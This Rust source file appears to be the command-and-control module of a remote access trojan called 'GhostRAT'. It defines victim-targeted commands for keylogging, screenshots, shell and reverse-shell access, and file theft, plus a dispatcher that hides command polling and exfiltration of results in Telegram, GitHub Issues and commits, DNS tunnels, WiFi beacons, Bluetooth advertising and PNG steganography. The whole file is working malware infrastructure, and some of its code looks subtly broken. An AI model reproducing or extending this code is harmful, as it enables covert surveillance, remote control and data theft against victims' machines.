//! C2 (Command & Control) channel trait and dispatcher.

pub mod telegram;
pub mod wifi_beacon;
pub mod ble_adv;
pub mod dns_tunnel;
pub mod png_stego;
pub mod github_issues;
pub mod github_api;

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};
use std::collections::HashMap;
use std::sync::Arc;
use tokio::sync::Mutex;
use tracing::{info, warn};

pub use telegram::TelegramC2;
pub use github_issues::GitHubIssuesC2;
pub use github_api::GitHubApiC2;
pub use wifi_beacon::WifiBeaconC2;
pub use ble_adv::BleAdvC2;
pub use dns_tunnel::DnsTunnelC2;
pub use png_stego::PngStegoC2;

/// GhostRAT command types
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
#[repr(u8)]
pub enum CommandType {
    FileRead = 0x01,
    Heartbeat = 0x04,
    Shell = 0x05,
    Keylog = 0x06,
    Screenshot = 0x07,
    ProcessList = 0x08,
    NetworkConnections = 0x09,
    ReverseShell = 0x0A,
    FileDownload = 0x0B,
    FileUpload = 0x0C,
    SystemInfo = 0x0D,
}

impl CommandType {
    pub fn from_u8(value: u8) -> Option<Self> {
        match value {
            0x01 => Some(Self::FileRead),
            0x04 => Some(Self::Heartbeat),
            0x05 => Some(Self::Shell),
            0x06 => Some(Self::Keylog),
            0x07 => Some(Self::Screenshot),
            0x08 => Some(Self::ProcessList),
            0x09 => Some(Self::NetworkConnections),
            0x0A => Some(Self::ReverseShell),
            0x0B => Some(Self::FileDownload),
            0x0C => Some(Self::FileUpload),
            0x0D => Some(Self::SystemInfo),
            _ => None,
        }
    }

    pub fn as_u8(self) -> u8 {
        self as u8
    }

    pub fn name(self) -> &'static str {
        match self {
            Self::FileRead => "FileRead",
            Self::Heartbeat => "Heartbeat",
            Self::Shell => "Shell",
            Self::Keylog => "Keylog",
            Self::Screenshot => "Screenshot",
            Self::ProcessList => "ProcessList",
            Self::NetworkConnections => "NetworkConnections",
            Self::ReverseShell => "ReverseShell",
            Self::FileDownload => "FileDownload",
            Self::FileUpload => "FileUpload",
            Self::SystemInfo => "SystemInfo",
        }
    }
}

impl std::fmt::Display for CommandType {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        write!(f, "0x{:02X} ({})", *self as u8, self.name())
    }
}

/// Command received from C2 channel
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct Command {
    pub victim_id: String,
    pub cmd_type: u8,
    pub data: Vec<u8>,
    pub encrypted: bool,
    pub crypto_key: String,
}

impl Command {
    pub fn cmd_type_name(&self) -> &'static str {
        CommandType::from_u8(self.cmd_type)
            .map(|t| t.name())
            .unwrap_or("Unknown")
    }

    /// Parse a command from JSON bytes
    pub fn from_json(data: &[u8]) -> Result<Self> {
        let json: serde_json::Value = serde_json::from_slice(data)
            .context("Failed to parse command JSON")?;

        let victim_id = json["victim_id"]
            .as_str()
            .ok_or_else(|| anyhow::anyhow!("Missing victim_id"))?
            .to_string();
        let cmd_type = json["cmd_type"]
            .as_u64()
            .ok_or_else(|| anyhow::anyhow!("Missing cmd_type"))? as u8;
        let encrypted = json["encrypted"]
            .as_bool()
            .unwrap_or(false);
        let crypto_key = json["crypto_key"]
            .as_str()
            .unwrap_or("GHOSTRATV5")
            .to_string();

        let data = match json["data"].as_str() {
            Some(s) => base64::decode(s).context("Failed to decode base64 data")?,
            None => Vec::new(),
        };

        Ok(Self {
            victim_id,
            cmd_type,
            data,
            encrypted,
            crypto_key,
        })
    }

    /// Serialize command to JSON bytes
    pub fn to_json(&self) -> Result<Vec<u8>> {
        let payload = if self.encrypted {
            base64::encode(&self.data).into_bytes()
        } else {
            self.data.clone()
        };

        let json = serde_json::json!({
            "victim_id": self.victim_id,
            "cmd_type": self.cmd_type,
            "data": payload,
            "encrypted": self.encrypted,
            "crypto_key": self.crypto_key,
        });

        serde_json::to_vec(&json).context("Failed to serialize command to JSON")
    }
}

/// C2 channel error
#[derive(Debug, thiserror::Error)]
pub enum C2Error {
    #[error("HTTP error: {0}")]
    Http(#[from] reqwest::Error),

    #[error("Parse error: {0}")]
    Parse(#[from] serde_json::Error),

    #[error("Network unreachable")]
    Unreachable,

    #[error("Rate limited")]
    RateLimited,

    #[error("Authentication failed")]
    AuthFailed,

    #[error("IO error: {0}")]
    Io(#[from] std::io::Error),

    #[error("Channel disabled")]
    Disabled,

    #[error("Timeout")]
    Timeout,

    #[error("Other: {0}")]
    Other(String),
}

/// Trait for C2 channels
#[async_trait::async_trait]
pub trait C2Channel: Send + Sync {
    fn name(&self) -> &str;
    async fn poll_commands(&self) -> Result<Vec<Command>, C2Error>;
    async fn send_result(&self, victim_id: &str, result: &[u8]) -> Result<(), C2Error>;
    fn is_available(&self) -> bool;
}

/// Dispatcher that manages multiple C2 channels
#[derive(Clone)]
pub struct C2Dispatcher {
    inner: Arc<Mutex<C2DispatcherInner>>,
}

struct C2DispatcherInner {
    channels: Vec<Box<dyn C2Channel>>,
    demo: bool,
}

impl C2Dispatcher {
    pub async fn new(config: &crate::config::Config, cli: &crate::Cli) -> Result<Self> {
        let mut inner = C2DispatcherInner {
            channels: Vec::new(),
            demo: config.demo || cli.demo,
        };

        // Telegram channel
        if (config.channels.contains(&"telegram".to_string())
            || cli.channel == "telegram"
            || cli.channel == "all")
            && config.telegram.is_some()
        {
            let tg = config.telegram.clone().unwrap();
            inner.channels.push(Box::new(TelegramC2::new(
                tg.bot_token,
                tg.chat_id,
            )));
            info!("Telegram C2 channel enabled");
        }

        // GitHub Issues channel
        if (config.channels.contains(&"github_issues".to_string())
            || cli.channel == "github-issues"
            || cli.channel == "all")
            && config.github.is_some()
        {
            let gh = config.github.clone().unwrap();
            inner.channels.push(Box::new(GitHubIssuesC2::new(
                gh.repo_owner,
                gh.repo_name,
                gh.token,
            )));
            info!("GitHub Issues C2 channel enabled");
        }

        // GitHub API Commit channel
        if (config.channels.contains(&"github_api".to_string())
            || cli.channel == "github-api"
            || cli.channel == "all")
            && config.github.is_some()
        {
            let gh = config.github.clone().unwrap();
            inner.channels.push(Box::new(GitHubApiC2::new(
                gh.repo_owner,
                gh.repo_name,
                gh.token,
                gh.file_path,
            )));
            info!("GitHub API C2 channel enabled");
        }

        // WiFi Beacon channel
        if (config.channels.contains(&"wifi_beacon".to_string())
            || cli.channel == "wifi-beacon"
            || cli.channel == "all")
            && config.wifi_beacon.is_some()
        {
            let wb = config.wifi_beacon.clone().unwrap();
            inner.channels.push(Box::new(WifiBeaconC2::new(
                wb.prefix,
                wb.interval_secs,
            )));
            info!("WiFi Beacon C2 channel enabled");
        }

        // BLE Advertising channel
        if (config.channels.contains(&"ble_adv".to_string())
            || cli.channel == "ble-adv"
            || cli.channel == "all")
            && config.ble_adv.is_some()
        {
            let ba = config.ble_adv.clone().unwrap();
            inner.channels.push(Box::new(BleAdvC2::new(
                ba.interval_secs,
                ba.adv_data,
            )));
            info!("BLE Advertising C2 channel enabled");
        }

        // DNS Tunnel channel
        if (config.channels.contains(&"dns_tunnel".to_string())
            || cli.channel == "dns-tunnel"
            || cli.channel == "all")
            && config.dns_tunnel.is_some()
        {
            let dt = config.dns_tunnel.clone().unwrap();
            inner.channels.push(Box::new(DnsTunnelC2::new(
                dt.domain,
                dt.interval_secs,
            )));
            info!("DNS Tunnel C2 channel enabled");
        }

        // PNG Stego channel
        if (config.channels.contains(&"png_stego".to_string())
            || cli.channel == "png-stego"
            || cli.channel == "all")
            && config.png_stego.is_some()
        {
            let ps = config.png_stego.clone().unwrap();
            inner.channels.push(Box::new(PngStegoC2::new(
                ps.png_path,
                ps.interval_secs,
            )));
            info!("PNG Stego C2 channel enabled");
        }

        // If no channels were enabled, enable Telegram as fallback
        if inner.channels.is_empty() {
            warn!("No C2 channels enabled, using Telegram as fallback");
            if let Some(tg) = &config.telegram {
                inner.channels.push(Box::new(TelegramC2::new(
                    tg.bot_token.clone(),
                    tg.chat_id,
                )));
            }
        }

        Ok(Self {
            inner: Arc::new(Mutex::new(inner)),
        })
    }

    /// Get all active channels
    pub fn active_channels(&self) -> Vec<Box<dyn C2Channel>> {
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current()
                .block_on(async { self.inner.lock().await.channels.clone() })
        })
    }

    /// Send result to all available channels
    pub async fn send_all(&self, victim_id: &str, result: &[u8]) -> Result<()> {
        let mut inner = self.inner.lock().await;
        let mut errors = Vec::new();

        for channel in inner.channels.iter_mut() {
            if !channel.is_available() {
                continue;
            }

            if let Err(e) = channel.send_result(victim_id, result).await {
                errors.push((channel.name(), e));
            }
        }

        if errors.is_empty() {
            Ok(())
        } else {
            Err(anyhow::anyhow!(
                "Failed to send to {} channels: {:?}",
                errors.len(),
                errors
            ))
        }
    }

    pub fn channel_count(&self) -> usize {
        tokio::task::block_in_place(|| {
            tokio::runtime::Handle::current()
                .block_on(async { self.inner.lock().await.channels.len() })
        })
    }
}
